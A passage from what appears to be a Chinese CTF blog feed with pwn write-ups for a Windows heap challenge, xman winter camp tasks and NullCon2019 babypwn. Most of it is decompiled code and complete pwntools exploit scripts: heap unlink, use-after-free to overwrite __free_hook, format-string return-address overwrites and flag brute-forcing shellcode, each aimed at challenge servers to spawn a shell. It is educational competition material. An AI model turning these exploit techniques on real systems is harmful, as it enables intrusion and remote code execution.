( !*(v5 - <span class="number">2</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v5[<span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        global_idx += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !v5[<span class="number">4</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        global_idx += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">      global_idx += <span class="number">4</span>;</span><br><span class="line">      v5 += <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">if</span> ( global_idx &gt;= <span class="number">0x10</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    ++global_idx;</span><br><span class="line">LABEL_13:</span><br><span class="line">    <span class="keyword">if</span> ( global_idx == <span class="number">16</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">    v3(<span class="string">"size &gt;"</span>);</span><br><span class="line">    Scanf(<span class="string">"%ud"</span>, &amp;v19);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt; <span class="number">0x90</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = (v19 &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">    chunk_addr = HeapAlloc(hHeap, <span class="number">1u</span>, v6);</span><br><span class="line">    v8 = dword_40338C;</span><br><span class="line">    *(_DWORD *)(dword_40338C + <span class="number">8</span> * global_idx) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">puts</span> | v6;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">8</span> * global_idx + <span class="number">4</span>) = chunk_addr;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">  v3(<span class="string">"Error!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'10.210.108.240'</span>, <span class="number">10031</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn', 28789)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"option &gt;"</span>,str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(sz)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size &gt;"</span>,str(sz))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index &gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index &gt;\r\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index &gt;"</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"content  &gt;"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#leak heap addr</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        Alloc(<span class="number">0x80</span>)<span class="comment">#0-5</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    heap_base = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    bss_1 = heap_base-(<span class="number">0x5b0</span><span class="number">-0x4a4</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,p32(bss_1<span class="number">-4</span>)+p32(bss_1))</span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,p32(bss_1<span class="number">-4</span>))</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    pe_base = u32(p.recvn(<span class="number">3</span>)+<span class="string">'\x00'</span>) - <span class="number">0x1049</span></span><br><span class="line">    log.success(<span class="string">"pe base =&gt; "</span> + hex(pe_base))</span><br><span class="line">    <span class="comment">#leak ucrtbase</span></span><br><span class="line">    Edit(<span class="number">1</span>,p32(pe_base+<span class="number">0x1049</span>)+p32(pe_base+<span class="number">0x2054</span>)+p32(pe_base+<span class="number">0x1049</span>)+p32(bss_1<span class="number">-4</span>))</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    ucrt_base = u32(p.recvn(<span class="number">4</span>)) - (<span class="number">0x770c53e0</span><span class="number">-0x77080000</span>)</span><br><span class="line">    log.success(<span class="string">"ucrt base =&gt; "</span> + hex(ucrt_base))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    system_addr = ucrt_base + (<span class="number">0x7716c730</span><span class="number">-0x77080000</span>)</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Edit(<span class="number">2</span>,p32(system_addr)+p32(bss_1+<span class="number">4</span>)+<span class="string">"cmd.exe\x00"</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>非常感谢xxrw和lyyl两位大佬的指导 :)</p>
<p><a href="https://www.lyyl.online/2019/10/09/windbg%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">windbg的使用</a></p>
<p><a href="https://blog.lyyl.online/2020/09/19/Windows-Pwn/" target="_blank" rel="noopener">WindowsPwn</a></p>
<p><a href="https://kirin-say.top/2020/01/01/Heap-in-Windows/" target="_blank" rel="noopener">Heap-in-Windows</a></p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/" target="_blank" rel="noopener">winpwn</a></p>
<p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version" target="_blank" rel="noopener">Windows 10 Nt Heap Exploitation (Chinese version)</a></p>
]]></content>
  </entry>
  <entry>
    <title>xman冬令营/NullCon2019/BUUCTF 部分pwn writeup</title>
    <url>/2020/09/03/xman/</url>
    <content><![CDATA[<h1 id="xman冬令营-NullCon2019-BUUCTF-部分pwn-writeup"><a href="#xman冬令营-NullCon2019-BUUCTF-部分pwn-writeup" class="headerlink" title="xman冬令营/NullCon2019/BUUCTF 部分pwn writeup"></a>xman冬令营/NullCon2019/BUUCTF 部分pwn writeup</h1><h2 id="xman冬令营选拔赛"><a href="#xman冬令营选拔赛" class="headerlink" title="xman冬令营选拔赛"></a>xman冬令营选拔赛</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一共四个题，kernel放弃了，arm本地通了远程失败，format最后队友出了就懒得调了。</p>
<h3 id="nosyscall"><a href="#nosyscall" class="headerlink" title="nosyscall"></a>nosyscall</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>逻辑很简单，可以写0x10的shellcode并执行，禁了所有的系统调用，开始flag读到了一个mmap的地址里，这里用<code>cmp</code>爆破，正确就报错EOF否则回到开头死循环卡住。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST18_8</span></span><br><span class="line">  FILE *v6; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  sub_B91();</span><br><span class="line">  v6 = fopen(<span class="string">"./flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v3 = mmap((<span class="keyword">void</span> *)<span class="number">0x200000000</span>LL, <span class="number">0x2000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  buf = mmap((<span class="keyword">void</span> *)<span class="number">0x300000000</span>LL, <span class="number">0x20000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  _isoc99_fscanf(v6, <span class="string">"%s"</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your Shellcode &gt;&gt;"</span>, <span class="string">"%s"</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  sub_C34();</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">void</span> *))buf)(<span class="number">0L</span>L, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><p>遇到EOF手动ctrl+z，进入死循环ctrl+c，之后手动加下dis</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./chall'</span>)</span><br><span class="line">bak = <span class="string">'&#123;&#125;_'</span>+string.ascii_lowercase + string.digits</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./chall'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'121.36.64.245'</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(char,dis)</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#sc = asm(shellcraft.amd64.linux.sh())</span></span><br><span class="line">    <span class="comment">#sc= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your Shellcode &gt;&gt;"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0000555555554000+0xd87')</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sc = asm(<span class="string">"L1:mov bl,"</span>+str(ord(char))+<span class="string">";"</span>+<span class="string">"mov rdx,[rsp+0x18];"</span>+<span class="string">'mov rdx,[rdx+'</span>+str(dis)+<span class="string">'];'</span>+<span class="string">'cmp bl,dl;jz L1'</span>)</span><br><span class="line">    p.send(sc)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">dis = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_exit</span><span class="params">(signum,frame)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> str(dis+<span class="number">1</span>)+<span class="string">" char is "</span> + bak[count]</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">err_exit</span><span class="params">(signum,frame)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p = process(<span class="string">'./chall'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'121.36.64.245'</span>,<span class="number">10003</span>)</span><br><span class="line">    <span class="keyword">print</span> count</span><br><span class="line">    <span class="keyword">print</span> bak[count]</span><br><span class="line">    exp(bak[count],dis)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    signal.signal(signal.SIGINT,my_exit)</span><br><span class="line">    signal.signal(signal.SIGTSTP, err_exit)</span><br><span class="line">    total = len(bak)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> count</span><br><span class="line">        <span class="keyword">print</span> bak[count]</span><br><span class="line">        exp(bak[count],dis)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p = process(<span class="string">'./chall'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'121.36.64.245'</span>,<span class="number">10003</span>)</span><br></pre></td></tr></table></figure>
<h3 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h4><p>题目很简单，主要记录一下arm pwn的一般做题方式。</p>
<h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p>可以add、del、print、edit，有UAF，是最简单的题了，题目本身就不再多说了，在<code>name</code>构造好一个fake chunk，malloc一个0xa0的块释放泄露libc，UAF到<code>name</code>进而可以Edit到notelist写入free_hook，再Edit即可改成system。</p>
<h4 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h4><p>查到了两篇比较详细的介绍，分别是<a href="https://xz.aliyun.com/t/3744" target="_blank" rel="noopener">arm32</a>以及<a href="https://xz.aliyun.com/t/3154" target="_blank" rel="noopener">arm64</a>，可以用<code>qemu-arm -L /usr/arm-linux-gnueabi ./pwn</code>启动或者<code>socat tcp-l:10002,fork exec:&quot;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./pwn&quot;,reuseaddr</code>用socat启动gdb attach上去。后者我调试发现有gdb server无法启动的问题，所以作罢了。<br>最后的解决方法是在exp.py里用<code>p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./pwn&quot;])</code>启动，之后开另一个终端用<code>gdb -q ./pwn</code>再查看这个进程的pid，在gdb内部<code>attach [pid]</code>进行调试，因为我们调试的是<code>qemu-arm</code>所以地址都是外层的，内层地址看不到。<br>开始泄露libc的时候我是启动时候加了<code>-g</code>参数直接在gdb里删除了一个大的块查看偏移，之后再用<code>exp.py</code>里调试。</p>
<h4 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice: '</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Note size :'</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content :"</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice: '</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index :'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice: '</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index :'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(p, idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice: '</span>, str(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index :'</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"You content:"</span>,content)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    context.binary = <span class="string">'./pwn'</span></span><br><span class="line">    elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">        p = remote(<span class="string">"172.16.9.45"</span>, <span class="number">10623</span>)</span><br><span class="line">        libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">elif</span> debug == <span class="number">1</span>:</span><br><span class="line">        p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabihf"</span>, <span class="string">"./pwn"</span>])</span><br><span class="line">        libc = ELF(<span class="string">'/usr/arm-linux-gnueabihf/lib/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">        p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">12345</span>)</span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabihf"</span>, <span class="string">"./pwn"</span>])</span><br><span class="line">        libc = ELF(<span class="string">'/usr/arm-linux-gnueabihf/lib/libc.so.6'</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    name_lis = <span class="number">0x21068</span></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">"Tell me your name:"</span>,p32(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">    add(p,<span class="number">0xa0</span>,<span class="string">'012345678'</span>)</span><br><span class="line">    add(p,<span class="number">0x18</span>,<span class="string">'1'</span>)</span><br><span class="line">    add(p,<span class="number">0x18</span>,<span class="string">'2'</span>)</span><br><span class="line">    add(p,<span class="number">0x18</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    delete(p,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    show(p,<span class="number">0</span>)</span><br><span class="line">    libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0xe87cc</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    free_addr = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    delete(p,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    edit(p,<span class="number">1</span>,p32(name_lis+<span class="number">0x18</span>))</span><br><span class="line">    add(p,<span class="number">0x18</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0</span>)*<span class="number">2</span>+p32(free_addr)</span><br><span class="line">    add(p,<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">    edit(p,<span class="number">2</span>,p32(system_addr))</span><br><span class="line">    delete(p,<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h4><p>似乎也没什么说的，嵌套了好几层函数，我的exp是改的<code>one_gadget</code>本地通了数据太多远程挂了，后来发现有后门，就更简单了，队友出了也懒得改了。</p>
<h4 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./chall'</span>)</span><br><span class="line">gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">    p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'119.3.172.70'</span>,<span class="number">10005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MyPrint</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"..."</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    payload = <span class="string">"%43$p|%10$p|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(<span class="number">0x3c</span>)+<span class="string">"c%10$hhn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(<span class="number">0x9d</span>)+<span class="string">"c%18$hhn"</span></span><br><span class="line">    MyPrint(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    libc_base = int(p.recv(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">247</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    retn_addr = int(p.recv(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">0x20</span> + <span class="number">4</span> + <span class="number">0x64</span> - <span class="number">0xc0</span></span><br><span class="line">    log.success(<span class="string">"retn addr =&gt; "</span> + hex(retn_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(shell_addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x08048627')</span></span><br><span class="line">    low = shell_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    high= shell_addr &gt;&gt; <span class="number">16</span></span><br><span class="line">    payload = <span class="string">"%"</span>+str(retn_addr&amp;<span class="number">0xffff</span>)+<span class="string">"c%10$hn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(low)+<span class="string">"c%18$hn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str((retn_addr+<span class="number">2</span>)&amp;<span class="number">0xff</span>)+<span class="string">"c%10$hhn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(high)+<span class="string">"c%18$hn"</span></span><br><span class="line">    MyPrint(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./chall'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'119.3.172.70'</span>,<span class="number">10005</span>)</span><br></pre></td></tr></table></figure>
<h2 id="NullCon2019-babypwn"><a href="#NullCon2019-babypwn" class="headerlink" title="NullCon2019 babypwn"></a>NullCon2019 babypwn</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>其实只有一道题，记一下<code>scanf</code>的性质，即遇到<code>+</code>/<code>-</code>输入会直接<code>ret</code>即不会将数据输入其中直接跳过，也不会崩溃。</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>先格式化字符串漏洞后栈溢出，输入使用的是<code>scanf</code>，第一次泄露libc之后拿<code>scanf</code>绕过<code>canary</code>改返回地址回<code>main</code>再get shell</p>
<h3 id="exp-py-3"><a href="#exp-py-3" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./chall'</span>)</span><br><span class="line">gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">    p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'119.3.172.70'</span>,<span class="number">10005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MyPrint</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"..."</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    payload = 